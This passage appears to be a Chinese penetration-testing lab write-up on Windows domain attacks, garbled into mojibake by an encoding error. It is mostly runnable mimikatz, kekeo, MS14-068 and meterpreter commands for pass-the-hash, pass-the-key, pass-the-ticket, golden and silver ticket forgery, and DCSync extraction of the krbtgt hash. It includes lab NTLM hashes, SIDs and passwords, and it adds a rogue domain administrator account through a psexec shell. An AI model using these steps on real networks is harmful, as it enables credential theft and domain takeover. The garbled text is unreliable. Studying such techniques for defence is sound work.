modeï¼Œæ‰§è¡Œåå¼¹å‡ºè¿œç¨‹æ¡Œé¢çš„ å‚æ•°è¯´æ˜ã€‚ å¦‚æœå½“å‰ç³»ç»Ÿæ”¯æŒRestricted Admin modeï¼Œæ‰§è¡Œåå¼¹å‡ºè¿œç¨‹æ¡Œé¢çš„ç™»å½•ç•Œé¢ã€‚ windows server2012æ˜¯æ”¯æŒå¹¶ä¸”é»˜è®¤å¼€å¯è¿™ä¸ªRestricted Admin modeï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡sqlserverä¸»æœº æ¥è¿æ¥ä¸€ä¸‹webserverä¸»æœºï¼š sekurlsa::pth user:administrator domain:WEBSERVER ntlm:518b98ad4178a53695dc997aa02d455c â€œrun:mstsc.exe restrictedadminâ€ å¡«å†™ipåœ°å€ä¹‹åï¼Œç‚¹å‡»è¿æ¥å³å¯ï¼Œä¸éœ€è¦è¾“å…¥ç”¨æˆ·åå’Œå¯†ç  ä½†æ˜¯åˆæŠ¥é”™äº† mdï¼Œå†è¯•ä¸€ä¸ªï¼Œè¿œç¨‹è¿æ¥jackpcé‚£ä¸ªwin8ä¸»æœºï¼Œåˆ«å¿˜äº†å…ˆå¼€å¯win8å…è®¸è¿œç¨‹è¿æ¥çš„åŠŸèƒ½ï¼Œè€Œä¸”æ¿€æ´»administratorç„¶åè¿è¡Œmimikatzæ”¶é›†administratorçš„NTML hashå¯†ç ï¼Œ jackçš„ipåœ°å€ä¸º192.168.241.29 win8.1 x64 jack-pc åŸŸå†…ä¸ªäººæœº ## æœ¬åœ°ç®¡ç†å‘˜è´¦å·å¯†ç  .\\jack : admin ## å½“å‰æœºå™¨åŸŸç”¨æˆ·å¯†ç  god\\boss : Admin12345 ## è·å–ä¿¡æ¯ï¼š * Username : Administrator * Domain : Jack-PC * NTLM : ccef208c6485269c20db2cad21734fe7 * SHA1 : 58d1a25c09f4ee98209941b2b333fbe477d472a9 ## hashä¼ é€’ sekurlsa::pth user:administrator domain:WEBSERVER ntlm:ccef208c6485269c20db2cad21734fe7 â€œrun:mstsc.exe restrictedadminâ€ 2-4 PTKPTKä¹Ÿæ˜¯é’ˆå¯¹NTMLçš„è®¤è¯è¿›è¡Œçš„ä¸€ç§æ”»å‡»æ‰‹æ³•ï¼ŒåŸç†æ˜¯é€šè¿‡è·å–ç”¨æˆ·çš„aes hmacå€¼æ¥å®Œæˆç™»å½•è®¤è¯ï¼Œè¿™ä¸ªå¯ä»¥ç”¨åœ¨æˆ‘ä»¬æ— æ³•è·å–å½“å‰ä¸»æœºçš„å¯†ç çš„æƒ…å†µä¸‹ã€‚è€Œä¸”æ˜¯åœ¨æ‰“äº†KB2871997è¡¥ä¸ä¹‹åæ‰èƒ½ç”¨è¿™ä¸ªæ–¹æ³• privilege::debug sekurlsa::ekeys å¯¼å‡ºkeyå€¼ mimikatz.exe â€œprivilege::debugâ€ â€œsekurlsa::ekeysâ€ keys.txt PTKä¼ é€’ï¼Œå°±ä¼ é€’çš„è¿™ä¸ªå€¼ã€‚ sekurlsa::pth user:[ç”¨æˆ·å] domain:[åŸŸåæˆ–â€œworkgroupâ€] aes256:[aes256çš„å€¼] ## é€šè¿‡æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·æ¥è¿æ¥maryä¸»æœºï¼šsekurlsa::pth user:mary domain:god.org aes256:329cb15457daf7747d932ee19a39a9e9aa7d561eea642123796ecb5a9dded088 PTKæ”»å‡»maryä¸»æœº win7 x64 mary-pc åŸŸå†…ä¸ªäººæœº æœ¬åœ°ç®¡ç†å‘˜è´¦å·å¯†ç  .\\mary : admin # å¯ä»¥è‡ªè¡Œå¼€å¯administrator å¯†ç è®¾ç½®ä¸ºadmin!@#45 å½“å‰æœºå™¨åŸŸç”¨æˆ·å¯†ç  god\\mary : admin!@#45 å…ˆç”¨ç®¡ç†å‘˜ç™»å½•ï¼Œç„¶åæˆ‘ä»¬æ”¶é›†ä¸€ä¸‹maryçš„aesçš„å€¼ï¼Œå…¶å®æŒ‰è¯´æˆ‘ä»¬åº”è¯¥åœ¨webserverä¸»æœºä¸Šæœæ˜‚ï¼Œä½†æ˜¯webserverä¸Šæ²¡æœ‰ã€‚ ä¸‹é¢æ˜¯ä¸ªå¤±è´¥çš„æ¼”ç¤ºï¼Œåº”è¯¥æ˜¯keyæ²¡æœ‰ç”¨å¯¹ï¼Œåé¢å†è¯´è¿™ä¸ªå§ã€‚ 2-5 PTTPTTå…¨ç§°pass the ticketï¼Œç¥¨æ®ä¼ é€’ä¸»è¦æ ¹æ®kerberosåè®®è®¤è¯åŸç†æ¥è¿›è¡Œæ”»å‡»çš„ã€‚ä¸»è¦çš„æ‰‹æ®µæ˜¯ä¼ªé€ ç¥¨æ®ï¼Œç»å¸¸ä½¿ç”¨çš„ä¼ªé€ é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®ï¼Œåé¢æˆ‘ä»¬ä¸€ä¸€æ¼”ç¤ºï¼Œå…¶å®é»„é‡‘å’Œç™½é“¶ç¥¨æ®ä¼ªé€ ä¸»è¦å½’ç±»ä¸ºæƒé™ç»´æŒï¼Œä¸è¿‡ä¹Ÿæ˜¯pass the ticketçš„æ‰‹æ®µã€‚ MS14-068 powershellæ‰§è¡Œ 1.æŸ¥çœ‹å½“å‰sid whoami user 2.å¯åŠ¨mimikatzï¼Œä¸éœ€è¦æå‡æƒé™ï¼Œèƒ½ç”¨å°±è¡Œ æ¸…ç©ºå½“å‰æœºå™¨ä¸­æ‰€æœ‰å‡­è¯ï¼Œå¦‚æœæœ‰åŸŸæˆå‘˜å‡­è¯ä¼šå½±å“å‡­è¯ä¼ªé€  kerberos::purge æŸ¥çœ‹å½“å‰æœºå™¨å‡­è¯ kerberos::list å°†ç¥¨æ®æ³¨å…¥åˆ°å†…å­˜ä¸­ kerberos::ptc [ç¥¨æ®æ–‡ä»¶] 3.åˆ©ç”¨ms14-068ç”ŸæˆTGTæ•°æ® ms14-068.exe -u [åŸŸæˆå‘˜å]@[åŸŸå] -s [sid] -d [åŸŸæ§IPåœ°å€] -p [åŸŸæˆå‘˜å¯†ç ] MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778- 1124 -d 192.168.241.21 - p admin!@#45 4.ç¥¨æ®æ³¨å…¥å†…å­˜ kerberos::ptc TGT_mary@god.org.ccache 5. æŸ¥çœ‹å‡­è¯åˆ—è¡¨ klist 6.åˆ©ç”¨ dir \\192.168.241.21\\c$ æ–¹å¼1ï¼šMS14-068https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068 è¿™ä¸ªæ¼æ´æ˜¯åŸŸææƒæ¼æ´ï¼ŒåŸç†å°±å’Œé»„é‡‘ç¥¨æ®ç›¸ä¼¼ï¼Œé€šè¿‡ç”Ÿæˆé»„é‡‘ç¥¨æ®ï¼Œå¯¼å…¥å·¥å…·ä¸­ï¼Œå°†ä¸€ä¸ªæ™®é€šæƒé™çš„åŸŸç”¨æˆ·è·å–åŸŸç®¡çš„ä½¿ç”¨æƒé™ï¼Œä»è€Œè¾¾åˆ°æ§åˆ¶æ•´ä¸ªåŸŸã€‚è¿˜æœ‰ä¸€äº›å…¶ä»–çš„åŸŸææƒæ¼æ´ï¼Œæ¯”å¦‚Zerologon åŸŸææƒæ¼æ´ç­‰ç­‰ï¼Œæœ‰å…´è¶£çš„å¯ä»¥ç ”ç©¶ä¸€ä¸‹ã€‚ å½“è·å–åŸŸç”¨æˆ·æ—¶ï¼Œå¯¹è¿™ä¸ªåŸŸè¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œè·å–æ˜¯å¦MS14-068ç›¸åº”è¡¥ä¸æƒ…å†µï¼š systeminfo | findstr â€œ3011780â€ å¥½ï¼Œè¯¥è¡¥ä¸æ²¡æœ‰æ‰“ï¼ŒçŒœæµ‹å­˜åœ¨MS14-068æ¼æ´ã€‚ ms14-068expä½¿ç”¨æ–¹æ³•ï¼š ms14-068.exe -u åŸŸæˆå‘˜å@åŸŸå -p åŸŸæˆå‘˜å¯†ç  -s åŸŸæˆå‘˜ sid -d åŸŸæ§åˆ¶å™¨åœ°å€ ä¸‹é¢æˆ‘ä»¬ä½¿ç”¨maryä¸»æœºæ¥è¿›è¡Œæµ‹è¯•ã€‚ æ”¶é›†åŸŸæˆå‘˜çš„SIDï¼š whoami all whoami user #åªå•ç‹¬æŸ¥è¯¢SID å¦‚ä¸‹ æŸ¥çœ‹ç”¨æˆ·ï¼Œä¸ºæ™®é€šåŸŸç”¨æˆ· æŸ¥è¯¢maryç”¨æˆ·çš„sid æ”¶é›†åŸŸç®¡è´¦å·åŠåŸŸåç§°ï¼š net time #è·å–åŸŸç®¡è´¦å· net config workstation #è·å–åŸŸä¿¡æ¯ nltest dsgetdc:moonsec #è·å–åŸŸç®¡ä¿¡æ¯ åœ¨åŸŸæ§ä¸»æœºä¸­æŸ¥çœ‹maryçš„æƒé™ï¼Œå…ˆæŸ¥çœ‹ä¸€ä¸‹åŸŸç®¡ç†å‘˜ç»„ å‘ç°maryæ²¡æœ‰åœ¨é‡Œé¢ å†æŸ¥çœ‹æ™®é€šåŸŸç”¨æˆ·ç»„ åœ¨maryä¸»æœºä¸Šä½¿ç”¨ä¸€ä¸‹mimikatzï¼Œçœ‹æ•ˆæœï¼Œæƒé™ä¸å¤Ÿ ä½¿ç”¨ms14-068çš„expæ¥ç”ŸæˆTGTé»„é‡‘ç¥¨æ® .\\MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.241.21 -p admin!@#45 æŸ¥çœ‹ä¸€ä¸‹å½“å‰è®¡ç®—æœºçš„ç¥¨æ®ï¼Œä¹Ÿå°±æ˜¯å½“å‰ä¸»æœºå’Œå“ªäº›ä¸»æœºå»ºç«‹è¿‡è¿æ¥ï¼Œè¿™éƒ½æ˜¯ä¹‹å‰ç”¨è¿‡çš„ç¥¨æ® é¦–å…ˆè¦æ¸…é™¤ä¸€ä¸‹ç¥¨æ®ï¼Œå› ä¸ºä¹‹å‰ç”¨è¿‡çš„ç¥¨æ®è¿˜æ˜¯ä½æƒé™ç¥¨æ®ã€‚ç°åœ¨ä¼ªé€ å‡ºæ¥çš„ç¥¨æ®æ˜¯åŸŸç®¡ç†å‘˜ç”¨æˆ·çš„TGTç¥¨æ®ï¼Œå±äºsystemé«˜æƒé™ç¥¨æ®ã€‚ cmdæŒ‡ä»¤ï¼šklist purge mimikatzæŒ‡ä»¤ï¼š kerberos::purge #æ¸…ç©ºç¥¨æ® kerberos::ptc ç¥¨æ® #å¯¼å…¥ç¥¨æ® kerberos::list #æŸ¥çœ‹ç¥¨æ® é€šè¿‡mimikatzå¯¼å…¥å‰é¢ç”Ÿæˆçš„ç¥¨æ®æ¥å®Œæˆææƒã€‚ ç„¶åæŸ¥çœ‹ä¸€ä¸‹ç¥¨æ®ä¿¡æ¯ï¼Œå‡ºç°äº†ä¸€ä¸ªæ–°çš„å‡­æ®ä¿¡æ¯ ä½¿ç”¨å‡­æ®è¿æ¥åŸŸæ§ä¸»æœºï¼Œé‡æ–°å¼€å¯ä¸€ä¸ªpowershellï¼Œç›´æ¥å°±å¯ä»¥è¿æ¥åŸŸæ§ä¸»æœºäº†ã€‚ ç„¶åå¯ä»¥ä½¿ç”¨psexecåå¼¹cmdï¼Œè¿™é‡Œå°±ä¸æ¼”ç¤ºäº† Psexec64.exe accepteula s \\OWA2010CN-God.god.org cmd.exe # \\åŸŸåï¼Œæˆ‘ä»¬è¿™é‡Œå¦‚æœæ¸—é€çš„æ˜¯marypcï¼Œé‚£ä¹ˆéœ€è¦å†™æˆmarypcçš„åŸŸå é€šè¿‡åå¼¹çš„shellå¯åˆ›å»ºåŸŸç®¡è´¦å· net user jaden Jaden123 add domain net group â€œDomain Adminsâ€ jaden add domain ç„¶åå¯ä»¥çœ‹çœ‹ï¼Œå¦‚æœç¥¨æ®åˆ é™¤äº†ï¼Œæˆ‘ä»¬å°±ä¸èƒ½è¿æ¥äº†ã€‚ æ–¹å¼2ï¼škekeoå·¥å…·https://github.com/gentilkiwi/kekeo ä¸Šé¢çš„æ–¹æ³•ç”Ÿæˆå‡­æ®æ—¶ç”¨çš„æ˜¯æ˜æ–‡å¯†ç ï¼Œkekeoè¿™ä¸ªå·¥å…·å¯ä»¥ç”¨ntlm hashå¯†ç æ¥ç”Ÿæˆå‡­æ® ç¬¬äºŒç§åˆ©ç”¨å·¥å…·kekeo 1.ç”Ÿæˆç¥¨æ® .\\kekeo â€œtgt::ask user:[åŸŸæˆå‘˜å] domain:[åŸŸå] ntlm:[ntlmå€¼]â€ .\\kekeo â€œtgt::ask user:mary domain:god.org ntlm:518b98ad4178a53695dc997aa02d455câ€ 2.å¯¼å…¥ç¥¨æ® kerberos::ptt [ç¥¨æ®æ–‡ä»¶] kerberos::ptt TGT_mary@GOD.ORG_krbtgtgod.org@GOD.ORG.kirbi 3.æŸ¥çœ‹å‡­è¯ klist 4.åˆ©ç”¨net useè½½å…¥ dir \\192.168.241.21\\c$ TGTç”ŸæˆæˆåŠŸï¼Œæˆ‘ä»¬ä¸ºäº†çœ‹æ•ˆæœï¼Œå…ˆæ¸…é™¤ä¸€ä¸‹åŸæœ‰çš„ç¥¨æ® é€šè¿‡kekeoæ¥å¯¼å…¥ç¥¨æ® æŸ¥çœ‹å†…å­˜ä¸­çš„ç¥¨æ®æ˜¯å¦å­˜åœ¨äº† è¿æ¥åŸŸæ§çœ‹çœ‹æ˜¯å¦æˆåŠŸï¼Œè¿™é‡Œæœ‰ç‚¹é—®é¢˜ï¼Œæˆ‘å†æ’æŸ¥æ’æŸ¥å†ç»™å¤§å®¶æ›´æ–°å§ æ–¹å¼3ï¼šåˆ©ç”¨æœ¬åœ°ç¥¨æ® è¿™ç§æ–¹å¼éœ€ç®¡ç†æƒé™ï¼Œåˆ©ç”¨mimikatzæ”¶é›†æœ¬åœ°ç¥¨æ®ï¼Œå†å°†ç¥¨æ®å¯¼å…¥åˆ°å†…å­˜ä¸­è¿›è¡Œè¿æ¥ã€‚æœ‰å­˜æ´»æ—¶é—´é™åˆ¶ï¼Œå°±æ˜¯è¯´ï¼Œå°†webä¸»æœºä¹‹å‰ä¸å…¶ä»–ä¸»æœºå»ºç«‹è¿‡è¿æ¥ä¹‹åç¼“å­˜çš„ç¥¨æ®å¯¼å‡ºå‡ºæ¥ï¼Œç„¶åæ‰¾åˆ°å’ŒåŸŸæ§ä¸»æœºçš„è¿æ¥ç¥¨æ®ï¼Œæ‹¿æ¥å¯¼å…¥åˆ°å†…å­˜ä¸­ä½¿ç”¨ï¼Œçœ‹çœ‹è¿˜èƒ½ä¸èƒ½ç”¨ï¼Œå¦‚æœè¿‡æœŸäº†ï¼Œé‚£è‚¯å®šä¸èƒ½ç”¨äº†ï¼Œä¹Ÿæ˜¯ä¸€ç§å°è¯•ã€‚ privilege::debug sekurlsa::tickets export kerberos::ptt [ç¥¨æ®æ–‡ä»¶] å¯¼å‡ºç¥¨æ®ï¼š ç¥¨æ®ä¼šè‡ªåŠ¨ä¿å­˜åˆ°mimikatzæ‰€åœ¨ç›®å½•ï¼Œå¦‚ä¸‹ï¼š æƒ³ç”¨å“ªä¸ªæ–‡ä»¶å¯¹åº”çš„ç¥¨æ®å°±å¯ä»¥æŠŠè¿™ä¸ªæ–‡ä»¶æ”¾åˆ°mimikatzçš„ç›®å½•ä¸‹ï¼Œé€šè¿‡æŒ‡å®šæ–‡ä»¶åç§°å°±èƒ½å°†å¯¹åº”ç¥¨æ®å¯¼å…¥åˆ°å†…å­˜ä¸­ æ¯”å¦‚ï¼Œå…ˆæ¸…ç©ºä¸€ä¸‹å†…å­˜ä¸­çš„ç¥¨æ® ç„¶åå¯¼å…¥ç¥¨æ®è¿›è¡Œä½¿ç”¨ æŸ¥çœ‹klistï¼Œç¥¨æ®å¯¼å…¥æˆåŠŸäº† å®æˆ˜ä¸­ç”¨å¤„ä¸æ˜¯å¾ˆå¤§ï¼Œä½†æ˜¯ä¹Ÿå¯èƒ½ä¼šå‘æŒ¥ä¸€ç‚¹ä½œç”¨ï¼Œä½œç”¨ä¸å¤§çš„åŸå› æ˜¯ç¥¨æ®çš„æœ‰æ•ˆæœŸä¸€èˆ¬åªæœ‰10ä¸ªå°æ—¶ã€‚ æ€»ç»“ï¼špttä¼ é€’ä¸éœ€æœ¬åœ°ç®¡ç†å‘˜æƒé™ï¼Œè¿æ¥æ—¶ä¸»æœºåè¿æ¥ï¼ŒåŸºäºæ¼æ´ã€å·¥å…·ã€æœ¬åœ°ç¼“å­˜çš„ç¥¨æ® 2-6 é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®6-1 é»„é‡‘ç¥¨æ® è‹±æ–‡åä¸ºï¼šGolden Ticketsï¼Œè¿™é‡Œè®²çš„æ˜¯é»„é‡‘ç¥¨æ®çš„ä¼ªé€ ã€‚ åŸŸä¸­æœ‰ä¸€ä¸ªç‰¹æ®Šç”¨æˆ·å«åškrbtgtï¼Œè¯¥ç”¨æˆ·æ˜¯ç”¨äºKerberosèº«ä»½éªŒè¯çš„å¸æˆ·ï¼Œè·å¾—äº†è¯¥ç”¨æˆ·çš„hashï¼Œå°±å¯ä»¥ä¼ªé€ ç¥¨æ®è¿›è¡Œç¥¨æ®ä¼ é€’ã€‚åŸŸä¸­æ¯ä¸ªç”¨æˆ·çš„Ticketéƒ½æ˜¯ç”±krbtgtçš„å¯†ç Hashæ¥è®¡ç®—ç”Ÿæˆçš„ï¼Œå› æ­¤åªè¦è·å–åˆ°krbtgtçš„å¯†ç Hashï¼Œå°±å¯ä»¥éšæ„ä¼ªé€ Ticketï¼Œè¿›è€Œä½¿ç”¨Ticketç™»é™†åŸŸæ§åˆ¶å™¨ï¼Œä½¿ç”¨krbtgtç”¨æˆ·hashç”Ÿæˆçš„ç¥¨æ®è¢«ç§°ä¸ºGolden Ticketã€‚ 1-1 è·å–krbtgtç”¨æˆ·å“ˆå¸Œ****DCSync (mimikatz) mimikatz ä¼šæ¨¡æ‹ŸåŸŸæ§ï¼Œå‘ç›®æ ‡åŸŸæ§è¯·æ±‚è´¦å·å¯†ç ä¿¡æ¯ã€‚ è¿™ç§æ–¹å¼åŠ¨é™æ›´å°ï¼Œä¸ç”¨ç›´æ¥ç™»é™†åŸŸæ§ï¼Œä¹Ÿä¸éœ€è¦æå–NTDS.DITæ–‡ä»¶ã€‚éœ€è¦åŸŸç®¡ç†å‘˜æˆ–è€…å…¶ä»–ç±»ä¼¼çš„é«˜æƒé™è´¦æˆ·ã€‚æ‰€ä»¥æˆ‘ä»¬å…¶å®æœ€å¼€å§‹è¦æƒ³åŠæ³•è·å–åˆ°åŸŸæ§ç®¡ç†å‘˜çš„ç”¨æˆ·åå’Œå¯†ç ã€‚ä¸‹é¢æˆ‘å°±ç›´æ¥åœ¨åŸŸæ§ä¸»æœºä¸Šè·å–krbtgtç”¨æˆ·çš„hashå€¼äº†ã€‚ lsadump::dcsync user:krbtgt LSA(mimikatz) mimikatz å¯ä»¥åœ¨åŸŸæ§çš„æœ¬åœ°å®‰å…¨è®¤è¯(Local Security Authority)ä¸Šç›´æ¥è¯»å– privilege::debug lsadump::lsa inject name:krbtgt kiwi(meterpreter) é™¤äº†mimikatzï¼Œè¿˜å¯ä»¥ä½¿ç”¨meterpreterçš„wikiæ‰©å±• meterpreter getuid meterpreter load kiwi meterpreter dcsync_ntlm krbtgt Hashdump(meterpreter) meterpreter hashdump 1-2 é‡‘ç¥¨ä¼ªé€ ****æ–¹å¼1ï¼šmimikatz åˆ©ç”¨mimikatzå¯¼å‡ºkrbtgtè´¦å·ä¿¡æ¯ mimikatz.exe â€œprivilege::debugâ€ â€œlsadump::dcsync domain:God.org user:krbtgtâ€ â€œexitâ€loghash.txt æ•ˆæœå¦‚ä¸‹ åˆ©ç”¨mimikatzç”Ÿæˆé»„é‡‘ç¥¨æ®ï¼Œéœ€è¦ä¸Šé¢è·å–åˆ°çš„krbtgtç”¨æˆ·çš„NTML hashå’ŒSID mimikatz.exe â€œkerberos::golden admin:system domain:God.org sid:S-1-5-21-1218902331-2157346161-1782232778 krbtgt:b097d7ed97495408e1537f706c357fc5 ticket:ticket.kirbiâ€ exit # æ³¨æ„è¿™é‡Œçš„æ˜¯åŸŸSID+RID(-502) RIDå»æ‰åæ‰æ˜¯åŸŸSIDï¼Œæˆ‘è¿™é‡Œå°è¯•çš„æ—¶å€™æ²¡æœ‰å»æ‰ï¼Œæ„Ÿè§‰ä¹Ÿæ²¡é—®é¢˜ å¦‚ä¸‹ï¼Œæˆ‘ä»¬åœ¨webserverä¸»æœºä¸Šå»ç”Ÿæˆé‡‘ç¥¨ æ¸…ç©ºwebserverä¸»æœºå†…å­˜ä¸­ç¼“å­˜çš„ä¹‹å‰çš„ç¥¨æ®ï¼Œç„¶åè®¿é—®DCåŸŸæ§ä¸»æœºçš„èµ„æºï¼Œçœ‹æ•ˆæœ å°†ç¥¨æ®æ³¨å…¥å†…å­˜ï¼š kerberos::purge #æ¸…é™¤ç¥¨æ® æˆ–è€…klist purge kerberos::ptt ç¥¨æ®æ–‡ä»¶åç§°ï¼Œå¦‚æœæ²¡æœ‰å’Œmimikatzåœ¨åŒä¸€ç›®å½•ä¸‹å°±å†™æ–‡ä»¶è·¯å¾„ #å°†ç¥¨æ®æ³¨å…¥å†…å­˜ ç»™webserverä¸»æœºæ³¨å…¥TGTé‡‘ç¥¨ æˆåŠŸäº†ï¼Œé‚£ä¹ˆwebserveråŸºæœ¬ä¸Šå¯ä»¥è®¿é—®åŸŸå†…çš„åŸŸæ§ä¸»æœºå’Œå…¶ä»–ä¸»æœºäº†ã€‚æ³¨æ„ï¼šåšå®éªŒçš„æ—¶å€™åˆ«å¿˜äº†çœ‹çœ‹æ˜¯å¦æœ‰ä¹‹å‰å»ºç«‹çš„IPCè¿æ¥ï¼Œå®ƒä¼šå½±å“æˆ‘ä»¬çš„å®éªŒã€‚ æ–¹å¼2ï¼škiwi(meterpreter) ä¸æ¼”ç¤ºäº†ã€‚ 1. åŠ è½½kiwi load kiwi 2. åˆ›å»ºç¥¨æ® golden_ticket_create -d åŸŸå -u ä»»æ„ç”¨æˆ·å -s -k -t ä¾‹å¦‚ï¼šgolden_ticket_create -d God.org -u jaden -s sid:S-1-5-21-1218902331-2157346161-1782232778-502 -k b097d7ed97495408e1537f706c357fc5 -t tmpkrbtgt.ticket 3. æ³¨å…¥åˆ°å†…å­˜ kerberos_ticket_use tmpkrbtgt.ticket 4. ä¹Ÿå¯ä½¿ç”¨wmicåœ¨WEBæœºå™¨ä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œä¸‹é¢çš„æŒ‡ä»¤æŒ‰ç…§è‡ªå·±çš„å®é™…ç¯å¢ƒæ¥å†™ wmic authority:â€kerberos:god\\WEBâ€ node:â€WEBâ€ process call create â€œcalcâ€ 6-2 ç™½é“¶ç¥¨æ® é»„é‡‘ç¥¨æ®æ˜¯ä¼ªé€ çš„ TGTï¼Œç™½é“¶ç¥¨æ®å°±æ˜¯ä¼ªé€ çš„ STï¼Œç™½é“¶ç¥¨æ®ä¹Ÿç§°ä¸ºä¸“ç¥¨,å°±æ˜¯æŒ‡å®šå»è®¿é—®æŸä¸€ä¸ªæœåŠ¡çš„ã€‚ å½“æˆ‘ä»¬è·å–åˆ°åŸŸå†…ä¸€å°æœåŠ¡å™¨çš„åŸŸç”¨æˆ·NTLM Hashä¹‹åï¼Œå°±å¯ä»¥å¯¹STç¥¨æ®è¿›è¡Œä¼ªé€ ã€‚åœ¨å‰é¢çš„Kerberosè®¤è¯æ¨¡å‹ä¸­ï¼ŒSTæ˜¯ç»è¿‡ç›®æ ‡æœåŠ¡å™¨çš„NTLM HashåŠ å¯†çš„ï¼Œåœ¨æœ€åè¿›è¡ŒéªŒè¯çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨ä¼šè§£å¯†STï¼Œä»ä¸­å–å‡ºç”¨æˆ·ä¿¡æ¯ï¼Œç„¶åå’Œå®¢æˆ·ç«¯å‘é€çš„ç”¨æˆ·ä¿¡æ¯åšä¸€ä¸ªå¯¹æ¯”ï¼Œå®ŒæˆéªŒè¯ã€‚å› æ­¤ï¼Œå¦‚æœè·å–åˆ°ç›®æ ‡æœåŠ¡ç«¯çš„NTLM Hashï¼Œé‚£ä¹ˆè¿™ä¸¤æ®µå®¢æˆ·ç«¯å‘é€çš„ä¿¡æ¯éƒ½å¯ä»¥è¿›è¡Œä¼ªé€ ã€‚ï¼ˆè¿™é‡Œæ³¨æ„ä¸€ç‚¹ï¼šæ˜¯ç›®æ ‡æœåŠ¡å™¨çš„æŸç”¨æˆ·çš„NTLM Hashï¼Œè€Œä¸æ˜¯åŸŸå†…éšä¾¿ä¸€ä¸ªç”¨æˆ·çš„NTLM Hashï¼‰åˆ¶ä½œç™½é“¶ç¥¨æ®çš„æ¡ä»¶ 1ã€domain: æŒ‡å®šåŸŸå 2ã€sid: å®¢æˆ·ç«¯ç”¨æˆ·çš„sidå· 3ã€target: éœ€è¦è®¿é—®çš„åŸŸæœåŠ¡å™¨çš„è®¡ç®—æœºå…¨å 4ã€rc4: ç›®æ ‡æœåŠ¡å™¨çš„æŸç”¨æˆ·çš„NTLM Hashå€¼ï¼Œä¸€èˆ¬ç”¨administratorçš„ 5ã€serviceï¼šéœ€è¦ä¼ªé€ çš„æœåŠ¡ï¼Œä¾‹å¦‚cifsè®¿é—®æ–‡ä»¶æœåŠ¡ 6ã€user: æŒ‡å®šéœ€è¦ä¼ªé€ çš„ç”¨æˆ· 7ã€ptt: å°†ä¼ªé€ çš„ç¥¨æ®å¯¼å…¥å†…å­˜ æ¯”å¦‚ï¼šæˆ‘ä»¬åœ¨åŸŸç¯å¢ƒä¸­ï¼Œå¾—åˆ°äº†åŸŸæ§ä¸»æœºè´¦å·çš„ NTLM Hash å€¼ï¼Œç„¶åå°è¯•åˆ©ç”¨ç™½é“¶ç¥¨æ®çš„ä¼ªé€ ï¼Œè®¿é—®åŸŸæ§ä¸Šçš„æ–‡ä»¶æœåŠ¡åˆ—è¡¨ã€‚ mimikatz å…ˆè·å–åŸŸæ§ä¸»æœºçš„administratorçš„NTML hashå€¼å’ŒSIDå€¼ å¾—åˆ°æœåŠ¡è´¦å·çš„ HASH ä¹‹åä½¿ç”¨mimikatzä¸­çš„ kerberos::goldenåŠŸèƒ½ç”Ÿæˆç™½é“¶ç¥¨æ®TGS ticketã€‚ å…ˆæ¸…é™¤åŸæœ‰çš„ä¸€äº›ç¥¨æ®ï¼Œç„¶åè®¿é—®åŸŸæ§çš„æ–‡ä»¶æœåŠ¡ï¼š å¤±è´¥ï¼Œå› ä¸ºæ²¡æœ‰ç¥¨æ®ï¼Œç„¶ååœ¨webserverä¸»æœºä¸Šæ‰§è¡Œå¦‚ä¸‹æŒ‡ä»¤æ¥ä¼ªé€ STé“¶ç¥¨ï¼š kerberos::golden domain:god.org sid:S-1-5-21-1218902331-2157346161-1782232778 target:owa.god.org rc4:ccef208c6485269c20db2cad21734fe7 service:cifs user:administrator ptt kerberos::golden domain:god.org sid:S-1-5-21-1218902331-2157346161-1782232778 target:192.168.241.21 rc4:ccef208c6485269c20db2cad21734fe7 service:cifs user:administrator ptt ä¼ªé€ å‡ºæ¥çš„åº”è¯¥æ˜¯20åˆ†é’Ÿæœ‰æ•ˆæœŸï¼Œå¦‚æœå¤±æ•ˆäº†å°±ç»§ç»­ä¼ªé€ ã€‚ ç„¶åå†æ¬¡è®¿é—®DCçš„æ–‡ä»¶æœåŠ¡ 2-7 SPNæ¼æ´æœŸå¾…ä¸­ã€‚ã€‚ã€‚Kerberoastingæ”»å‡»ã€spnæ‰«æç­‰ç­‰ 2-8 ladonå·¥å…·å›½äº§Ladonå†…ç½‘æ¸—é€å¼ºåŠ›å·¥å…·ï¼Œè¿˜å¯ä»¥é…åˆCSï¼Œä½œä¸ºCSçš„æ’ä»¶ï¼ŒåŠŸèƒ½é½å…¨ã€‚ä¸»è¦æ˜¯ä¿¡æ¯æ”¶é›†-åè®®æ‰«æ-æ¼æ´æ¢é’ˆ-ä¼ é€’æ”»å‡»ç­‰ ä¸‹è½½åœ°å€ï¼š Ladonï¼šhttps://github.com/k8gege/Ladon Ladon 9.1.1 CobaltStrikeç¥é¾™æ’ä»¶å‘å¸ƒï¼šhttp://k8gege.org/Ladon/cs911.html ä½¿ç”¨è¯´æ˜æ–‡æ¡£ï¼š http://k8gege.org/Ladon/ http://k8gege.org/p/Ladon.html 8-1 ä¿¡æ¯æ”¶é›† æ”¶é›†åœ¨çº¿å­˜æ´»ä¸»æœº 8-2 wiki å·¥å…·çš„ä½¿ç”¨è¯´æ˜ï¼š æˆ‘ä»¬ç”¨ä¸€ä¸‹å‘½ä»¤ç»ˆç«¯å·¥å…·ï¼š æ”¶é›†å­˜æ´»ä¸»æœº 8-3 æ¼æ´æ‰«æ æ‰¹é‡æ‰«ææ˜¯å¦å­˜åœ¨ms17010æ¼æ´ï¼Œå›æ˜¾ä¸ºç´«è‰²çš„è¡¨ç¤ºå­˜åœ¨è¿™ä¸ªæ¼æ´ã€‚ 8-4 æ¢æµ‹æœåŠ¡ æ¯”å¦‚æ¢æµ‹smbæœåŠ¡çš„å¼€æ”¾æƒ…å†µ 8-5 è¿æ¥å·¥å…· è¿˜å¯ä»¥ç›´æ¥ä½¿ç”¨ladonä¸­é›†æˆçš„psexecå·¥å…·æ¥è¿›è¡Œè¿æ¥ 